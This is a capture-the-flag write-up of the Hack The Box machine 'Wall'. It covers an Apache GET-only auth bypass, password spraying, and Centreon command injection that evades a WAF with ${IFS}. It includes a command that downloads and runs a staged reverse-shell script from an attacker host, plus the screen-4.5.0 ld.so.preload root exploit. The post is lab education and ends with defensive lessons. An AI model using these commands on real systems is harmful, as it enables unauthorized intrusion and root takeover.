---
layout: post
title: "The Limit Was a Suggestion"
subtitle: "HTB Wall, where a login that only guards the front verb, a firewall allergic to spaces, and a SUID screen stack into a clean root"
date: 2019-12-14 12:00:00 +0000
description: "A login guards GET and forgets POST, a firewall hates spaces but loves ${IFS}, and an old screen binary hands over root."
image: /assets/og/the-limit-was-a-suggestion.png
tags: [hackthebox, writeup]
---

Wall is named for the things that are supposed to keep you out, and every wall on the box has a door cut into it that nobody remembered to close. A login screen guards the page but only frisks people who knock with GET, so you knock with POST and walk straight past it. Behind it sits a monitoring console with a known command-injection bug, except a firewall stands in the hallway slapping down any request that contains a space, which feels like a real wall until you learn the magic word that means space without being one. Then a strong password sits hidden inside a compiled Python file, which is a vault made of frosted glass. And at the very end an old version of a screen-sharing tool runs as root and will quietly build you a backdoor if you ask it wrong. Four walls, four doors. The whole box is a lesson in how a barrier that only watches one direction is not a barrier at all.

```
        W A L L
        =======
        GET  /monitoring   →  401  "halt, who goes there"
        POST /monitoring   →  200  "oh, you. go on in."
                 |
                 v
        centreon console, command-injection bug,
        a firewall in the hall that hates spaces
                 |
                 v
        ${IFS}  the word that means space
        without ever being a space
                 |
                 v
        a password baked into a .pyc,
        a screen binary wearing the root crown
                                            墙
```

## 0x01 · two ports and a quiet site

`nmap` is short and tells you almost nothing, which is its own kind of tell. Two ports, both ordinary.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

This is a modern Ubuntu 18.04 host, not a fossil. SSH is current and the Apache is current, so the front of the box is not going to fall over to a version number. The web root serves a default Apache page, the kind that means "nothing to see here," and on a box this quiet that is an invitation to go looking for the pages that were not meant to be linked.

A `gobuster` sweep against port 80 turns up the floor plan.

```
# gobuster dir -u http://10.10.10.157 -w big.txt -x php
/panel.php     (200)
/monitoring    (401)
```

The `401` on `/monitoring` is the one that lights up. A `401` is not "go away," it is "show me your badge first." Something private lives there, and the server is at least admitting it exists.

## 0x02 · the limit that only watched one verb

Here is the first wall with a door in it. Hit `/monitoring` with a normal browser request and you get the Basic Auth box, the gray popup demanding a username and password you do not have. That looks like a full stop. It is not.

The Apache config protecting that directory was written like this, and the mistake is the whole box in one line.

```
<Limit GET>
    require valid-user
</Limit>
```

Read `<Limit GET>` literally, because Apache does. It says "require a valid login for GET requests." It does not say a single word about POST, or PUT, or HEAD, or any of the other ways an HTTP client can ask a server for something. The guard was told to check the badges of everyone arriving through the front door and was never told there is a back door labeled POST that opens onto the same room.

Think of it like a nightclub with a bouncer posted at the main entrance carding everyone who walks up, while the loading dock around the side stands wide open with the door propped on a milk crate. The bouncer is real. He is just guarding one of the two ways in. So you stop arguing with the bouncer and change your verb.

```
# curl -s -X POST http://10.10.10.157/monitoring/ | grep -i centreon
<meta http-equiv="refresh" content="0; url=/centreon/" />
```

The POST sails through with no badge at all and the page helpfully tells you where the real application lives. `/centreon/`. The login wall watched one verb and forgot the rest, and the cost of that omission was the entire perimeter.

## 0x03 · a console you can guess your way into

Centreon is an infrastructure-monitoring console, the kind of dashboard a sysadmin uses to watch a fleet of servers. It has its own login page, a proper one this time, and the front-page version string reads 19.04. That number matters, because Centreon 19.04 carries CVE-2019-13024, an authenticated command-injection bug. The catch is in the word authenticated. You need to be logged in first.

Centreon exposes an authentication endpoint in its API, which means you can throw password guesses at it from a script instead of typing them into a form, and a script never gets tired. A short run against the obvious admin account with a common wordlist lands almost immediately.

```
# the api returns a token on success, an error on failure;
# spray a wordlist at the admin user and watch for the token

admin : password1   →  authToken issued
```

The credentials are `admin` / `password1`, which is exactly the password a tired admin picks when the box is "just for monitoring, it's internal." Now you hold a valid session, and the authenticated bug stops being a rumor and becomes a plan.

## 0x04 · the firewall that was allergic to spaces

CVE-2019-13024 lives in how Centreon configures a poller, the helper process that goes out and checks on monitored hosts. One of the settings is the path to the monitoring binary, the `nagios_bin` field, and Centreon takes whatever string you put there and eventually feeds it to a shell when it generates the poller's config. A field that is supposed to hold a file path will just as cheerfully hold `path; your-command-here`, and the shell runs both halves.

So you set the poller's binary path to a command, then trigger config generation to make the shell read it.

```
# POST the injected nagios_bin, then trigger generation:
#   /centreon/include/configuration/configGenerate/xml/generateFiles.php
#   poller=1 & debug=true & generate=true
```

And here you hit the second wall, the real one. A ModSecurity web application firewall sits in front of Centreon reading every request body, and it has a list of words it refuses to pass. `nc`, `passwd`, `hostname`, the `#` character, the `+` character, and, most painfully, the literal space. Try to inject a normal command and the firewall throws a `403` in your face before the command ever reaches the shell. A WAF is a bouncer who reads your note before delivering it and tears it up if it sees a banned word.

The way through is a piece of shell trivia that the firewall's authors forgot to ban. In `bash`, the variable `${IFS}` expands to the Internal Field Separator, which by default is whitespace. So `${IFS}` is a space that is not spelled with a space. Picture trying to smuggle a forbidden word past a censor who only scans for that exact word, so you spell it in semaphore. The meaning arrives intact and the scanner sees nothing it recognizes. Rebuild your command with every space replaced by `${IFS}` and the WAF waves it through.

```
# instead of a banned reverse-shell one-liner, fetch and run a staged script,
# spelling every space as ${IFS} so the firewall sees no spaces and no 'nc'

wget${IFS}10.10.14.4/iceberg${IFS}-O${IFS}/tmp/iceberg;bash${IFS}/tmp/iceberg
```

The staged file `iceberg` is just [ a bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ], kept off the wire on purpose so the WAF never sees the banned tokens and so this page never ships a copy-paste shell. Start a listener, send the spaceless request, and a prompt drops in.

```
# nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.157
www-data@Wall:/$ id
uid=33(www-data) gid=33(www-data)
```

You are on the box as `www-data`, the low-privilege identity the web server runs as. The console wall is behind you.

## 0x05 · the password baked into glass

`www-data` cannot do much, so you go looking for somewhere to climb. There is a local user named `shelby`, and in a spot `www-data` can read sits a file named `backup` that is not a script you can read but a compiled Python file, a `.pyc`. Python compiles its source into this bytecode for speed, and people sometimes ship the `.pyc` while assuming the original source, and any secrets in it, stayed safely behind.

That assumption is glass, not steel. Decompilers exist precisely to turn bytecode back into readable source, and `uncompyle6` does it in one line.

```
www-data@Wall:/$ uncompyle6 backup
...
# the recovered source builds a string one character at a time,
# chr(ord(...)) for every letter, trying to look like noise
```

Whoever wrote it tried to hide the password by assembling it character by character with `chr` and `ord` instead of writing it as plain text, which is the programming equivalent of spelling a secret out loud one letter at a time and believing nobody in the room can spell. Reconstruct the string and the password falls out.

```
shelby : ShelbyPassw@rdIsStrong!
```

The password is, with no irony intended, strong. It just lived inside a file that announced its own contents to anyone who asked the decompiler nicely. Switch to the real user.

```
www-data@Wall:/$ su shelby
Password: ShelbyPassw@rdIsStrong!
shelby@Wall:~$ cat user.txt
████████████████████████████████
```

## 0x06 · the screen that built its own backdoor

One wall left, and it is the oldest kind. A scan of SUID binaries, the programs that run with the file owner's privileges instead of yours, turns up something that does not belong.

```
shelby@Wall:~$ find / -perm -4000 -type f 2>/dev/null
/bin/screen-4.5.0
```

`screen` is a terminal multiplexer, the tool that lets you detach a session and pick it up later, and version 4.5.0 specifically carries CVE-2017-5618. The bug is in how that version handles its log file. When `screen` runs as root, which a SUID binary effectively does, you can point its logging at a file that does not exist yet and `screen` creates that file as root. Crucially, the file `/etc/ld.so.preload` is a system-wide list of libraries the loader forces into every program before it starts. If you can write that file as root, you can make every program on the box load a library you wrote.

Think of it like a hotel where one master keycard, left in a copier anyone can use, will happily print you a fresh master keycard. The copier was only ever meant to copy paper. It cannot tell that the thing on the glass is the key to every room.

So the public screen2root routine does three moves. Compile a tiny shared library whose startup code chowns a shell to root and flips its SUID bit. Use the root-owned-file-creation bug in `screen-4.5.0` to write the path of that library into `/etc/ld.so.preload`. Then run any program, which now loads your library first, runs your root-owned setup, and leaves a root shell waiting.

```
shelby@Wall:~$ gcc -fPIC -shared -o /tmp/iceberg.so libhack.c -ldl
shelby@Wall:~$ screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/iceberg.so"
shelby@Wall:~$ screen-4.5.0 -ls    # triggers the preload, drops a root /tmp/rootshell
shelby@Wall:~$ /tmp/rootshell
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

No memory corruption, no shellcode. Just a root-owned program that creates files as root and a loader that trusts a file it should have questioned.

## 0x07 · the honest caveat

The flashy part of Wall is the `${IFS}` trick, and it is genuinely fun, but the firewall was never the real failure. The real failure is the first one, the `<Limit GET>` that guarded a single verb and called itself a wall. That mistake is everywhere, not just in old Apache configs. Authentication checks bolted onto one method, authorization logic that runs in the GET handler but not the POST handler, an API gateway that filters reads and forgets writes. Every one of them is the same confession. Somebody secured a door and never counted the doors. A control that protects one path while leaving a parallel path open is not a weak control, it is a decoration.

And the WAF deserves a fair word too, because it tells the harder truth. The firewall did its job exactly as written. It blocked spaces, blocked `nc`, blocked the words people put in payloads. It still lost, because a denylist is a list of the attacks someone already thought of, and `${IFS}` was not on the list. You cannot enumerate every way to spell a space. The lesson is not that filtering is useless, it is that filtering is a speed bump and never a wall. The thing that actually stops command injection is the same thing that stopped it on every box before this one. Do not hand attacker-controlled text to a shell. Centreon put a stranger's string into `shell_exec`, and every clever defense downstream of that decision was just choosing how long the breach would take.

## 0x08 · outro

```
the login watched the front door and forgot the loading dock.
the firewall banned the word and missed the synonym.
the password hid in glass and the screen built its own key.

four walls. four doors. none of them locked from both sides.

count the doors. distrust the denylist. wear black.

                                                            EOF
```

---

*HTB: Wall, retired 7 Dec 2019. A medium Linux box that is really a lecture on the difference between a barrier and a barrier that only watches one direction. The ${IFS} still means space in a lab and nowhere you don't own.*